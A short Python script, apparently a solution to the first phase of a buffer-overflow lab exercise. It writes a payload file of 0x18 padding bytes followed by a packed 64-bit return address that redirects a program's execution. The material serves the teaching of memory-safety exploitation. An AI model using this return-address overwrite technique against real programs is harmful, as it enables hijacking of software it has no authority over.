import struct

with open("phase1_payload.bin", "wb") as f:
    f.write(b"A" * 0x18)
    f.write(struct.pack("<q", 0x40184D))
